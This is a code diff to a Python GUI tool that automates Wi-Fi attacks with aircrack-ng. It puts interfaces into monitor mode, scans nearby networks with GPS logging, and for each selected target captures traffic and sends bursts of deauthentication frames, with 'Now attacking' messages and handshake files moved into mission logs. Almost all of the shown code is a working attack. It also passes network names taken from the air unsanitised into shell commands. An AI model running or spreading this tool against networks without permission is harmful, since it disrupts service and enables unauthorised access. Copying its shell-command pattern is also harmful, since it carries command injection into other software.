@@ -4,11 +4,12 @@ import os
 import sys
 import time
 from time import gmtime, strftime
-Interface = os.popen('ip a|grep w |awk -F : \'{print $2}\'|head -1').read()
+Interface = os.popen('ip a|grep w |awk -F : \'{print $2}\'').read()
 BSSIDS=[]
 mission =""
 interswitch=""
 def Logit(nm):
+	nm = nm.replace(" ","")
 	logname = strftime("%a,%d-%b-%Y_%H:%M",gmtime())
 	logged = (logname + nm)
 	os.system('mkdir /etc/7thseal/logs/' + nm)
@@ -21,10 +22,9 @@ def Scan():
 	os.system('mkdir /etc/7thseal/logs 2> /dev/null')
 	global BSSIDS
 	global Interface
-	Interface = str(Interface)
-	os.system('airmon-ng start' + Interface + ' 1> /dev/null')
-	Interface = os.popen('ip a|grep w |awk -F : \'{print $2}\'|head -1').read()
+	os.system('xgps &')
 	os.system('xterm -title \"7thsealSCAN\" -e airodump-ng --gpsd --band abg -w /etc/7thseal/breacher --output-format csv '+ Interface)
+	os.system('ps -elf |grep xgps|head -1|awk \'{print $4}\'|xargs kill')
 	time.sleep(5)
 	breacher = open("/etc/7thseal/breacher-01.csv","r")
 	uniq=[]
@@ -58,6 +58,8 @@ def Menu():
 		global Interface
 		for i in face.curselection():
 			Interface = face.get(i)
+		os.system('airmon-ng start ' + Interface )
+		Interface = os.popen('ip a|grep mon |awk -F : \'{print $2}\'').read()
 	face.grid(row =1, column=1)
 	setinterface = tk.Button(seal,text="Set the interface",command=setINT)
 	setinterface.grid(row=1,column=2)
@@ -87,14 +89,20 @@ def Results():
 			target=str(z[0])
 			essid=str(z[1])
 			ch=str(z[2])
-			os.system('(xterm -title \"AllHearing\" -e airodump-ng -c '+ch+' --bssid '+ target +' -w /etc/7thseal/'+essid+' --output-format pcap '+ Interface+')&' )
+			essids =essid.replace(" ","")
+			print("Now attacking",essid)
+			time.sleep(2)
+			print('/etc/7thseal/'+essids)
+			os.system('(xterm -title \"AllHearing\" -e airodump-ng -c '+ch+' --bssid '+ target +' -w /etc/7thseal/'+essids+' --output-format pcap'+Interface+')&' )
 			time.sleep(10)
+			print("Sending DeAuth at",essid)
 			os.system('aireplay-ng -0 30 -a '+target+' '+ Interface)
 			time.sleep(15)
 			os.system('ps -elf|grep xterm|awk \'{print $4}\'|xargs kill')
 			Logit(mission)
-			os.system('mv /etc/7thseal/'+essid+'-01.cap /etc/7thseal/logs/'+mission+'/')
-			
+			os.system('mv /etc/7thseal/'+essids+'-01.cap /etc/7thseal/logs/'+mission+'/')
+			print("Moving to next target")
+			time.sleep(2)
 	attack = tk.Button(popout,text="Attack Selected",command=Attack)
 	attack.grid(row=4,column=4)
 	Res.grid(row=0,column=0)
